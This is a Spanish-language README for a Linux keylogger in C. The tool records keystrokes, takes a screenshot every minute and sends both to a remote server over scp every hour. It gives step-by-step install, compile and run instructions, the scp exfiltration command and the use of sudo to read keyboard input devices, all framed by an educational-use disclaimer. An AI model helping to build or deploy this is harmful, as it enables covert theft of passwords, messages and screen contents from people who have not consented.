# Keylogger + Caps 👁

Keylogger con función de capturas de pantalla y envio de datos a un servidor configurable **LINUX**.

# ⚠️ ADVERTENCIA

Este proyecto fue desarrollado **exclusivamente con fines educacionales** como parte de un curso de seguridad informática. **No debe ser utilizado en ningún otro contexto ni con intenciones maliciosas.**

**Aviso Legal:**

El uso de keyloggers esta estrictamente prohibido en diversos países si no se cuenta con el consentimiento explícito del usuario final. El monitoreo o captura de las actividades de un usuario sin su autorización es una violación grave de la privacidad y puede conllevar sanciones legales.

Este código **no debe ser utilizado fuera del entorno educacional ni aplicado a sistemas en producción o dispositivos ajenos sin autorización y consentimiento explicito.**
**El autor no se hace responsable por el uso indebido de este código.** Cualquier intento de utilizar este proyecto para propósitos distintos a los estipulados en este repositorio es **bajo responsabilidad del usuario.**

# Requisitos:

_Nota: La distribución usada y la de este tutorial es para sistemas basados en Debian._
_El código del ejemplo fue probado en un sistema con Parrot por lo que puede variar dependiendo del sistema utilizado._

Es necesario contar con lo siguiente para poder ejecutar y/o compilar el programa:

- **Compilador de C (en este caso gcc).**
- **Libreria scrot (para captura de pantalla).**

```bash
  sudo apt-get install scrot
```

- **Libreria openssh-client (para el envio de datos a servidor local).**

```bash
  sudo apt-get install openssh-client
```

<!-- - **Librerias evdev (para trabajar con evdev).**

```bash
  sudo apt-get install libevdev-dev
``` -->

**Nota:** Además, se utilizaron otras librerias que estan preinstaladas en entornos linux, en caso no presentar errores de librerias, aqui se encuentra un listado con todas las que se utilizaron.

```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <fcntl.h>
  #include <unistd.h>
  #include <linux/input.h>
  #include <linux/input-event-codes.h>
  #include <pthread.h>
  #include <time.h>
```

# Instrucciones de uso:

Clonar este repositorio con ayuda del comando:

```c
  git clone https://github.com/NightMare070/keylogger_linux
```

Dentro de keylogger.c configurar las rutas de acuerdo a donde se requieran:

```c
  //Por defecto se crean en el mismo directorio donde
  //se encuentra el ejecutable

  // Ruta del archivo que registra las teclas
  log_file = fopen("keylog.txt", "a");
  //Ruta de la carpeta que contiene las imagenes
  snprintf(filename, sizeof(filename), "screenshot_%04d-%02d-%02d_%02d-%02d-%02d.png",
```

Dentro de keylogger.c en la función **_transfer_files_** modificar la variable de acuerdo a tu servidor:

```c
  //Variable de ruta
  snprintf(command, sizeof(command), "scp keylog.txt screenshot_*.png user@server:/path/to/destination/");
```

Una vez teniendo el archivo **keylogger.c** configurado ejecutar el siguiente comando para compilarlo:

```bash
  gcc -o keylogger keylogger.c -pthread
```

y despues ejecutar de la siguiente manera:

```bash
  sudo ./keylogger
```

Y automaticamente despues de ejecutar, se  creara un TXT en la ruta del ejecutable **keylogger** que empezará a registrar las teclas que vamos pulsando además de tomar capturas de pantalla **cada minuto** y enviarlas a un servidor cada hora.

# Supuestos del programa:

## Sistema Operativo:

1. El programa está diseñado para ejecutarse en una distribución de Linux.

## Permisos de Usuario:

1. Se asume que el programa se ejecuta con los permisos necesarios para acceder a los dispositivos de entrada del teclado **(/dev/input/event3)** y que tiene permisos de escritura en el directorio donde se almacenarán los registros y capturas de pantalla.

## Dependencias Instaladas:

1. **libssh2**  para manejar las conexiones SSH.

2. **scrot** para tomar capturas de pantalla.

3. **pthread** para manejar la concurrencia (aunque pthread.h está preinstalado en la mayoría de los sistemas Linux, es necesario asegurarse de que esté disponible).

## Configuración SSH:

1. Se asume que las credenciales de acceso SSH al servidor remoto están configuradas correctamente, ya sea mediante autenticación por clave o usuario/contraseña, y que el servidor remoto está accesible.

## Conexión a Internet:

1. Se asume que la máquina en la que se ejecuta el programa tiene conexión a Internet para poder realizar el envío de los archivos al servidor remoto.

## Directorio de Trabajo:

1. Se asume que el directorio donde se almacenan las capturas de pantalla y los registros de teclas tiene suficiente espacio en disco.

# Casos de uso:

El programa funciona en forma de **3 hilos**, **1 para registrar las teclas**, **1 para tomar las screenshots** y **otro para enviar la información al servidor.** Por lo que técnicamente funcionan de forma independiente y no dependen uno del otro. Sin embargo si no se encuentra el TXT (en un caso hipotético), el programa no tendrá nada para enviar al servidor y lo mismo con las imagenes.

## Hilo principal (main):

| Paso | Actor | Sistema                                    | Si falla                           |
| ---- | ----- | ------------------------------------------ | ---------------------------------- |
| 1    |       | Crear hilos de ejecución para cada tarea   |
| 2    |       | Se crea el hilo del keylogger              | No se registrarán las teclas       |
| 3    |       | Se crea el hilo del tomador de screenshots | No se tomarán screenshots          |
| 4    |       | Se crea el hilo del envio a servidor       | No se enviarán datos a el servidor |

Entonces podemos dividir los casos de uso en 3 partes.

Además, podemos agregar un caso extra por el monitorio constante tanto de teclas, como de capturas de pantalla.

1. Registro de Teclas:

- **Descripción:** El programa captura las pulsaciones de teclas del usuario en tiempo real y las almacena en un archivo **keylog.txt**.
- **Caso de Uso:** Registrar la actividad del teclado para su posterior análisis.

2. Captura de Pantallas:

- **Descripción:** Cada minuto, el programa toma una captura de pantalla y la guarda con un nombre que incluye la fecha y hora de la captura.
- **Caso de Uso:** Monitorear la actividad visual de la pantalla para revisar lo que se muestra en intervalos regulares.

3. Envío de Datos al Servidor Remoto:

- **Descripción:** Cada hora, el programa empaqueta los archivos **keylog.txt** y las capturas de pantalla en un archivo comprimido y lo envía a un servidor remoto usando SSH.
- **Caso de Uso:** Transferir los datos recopilados a un servidor remoto para su almacenamiento o análisis.

4. Monitoreo Concurrente:

- **Descripción:** El programa ejecuta las tareas de captura de teclas, captura de pantalla y envío de datos de manera concurrente usando hilos **(pthread)**.
- **Caso de Uso:** Permitir que todas las funcionalidades se ejecuten simultáneamente sin interferencias.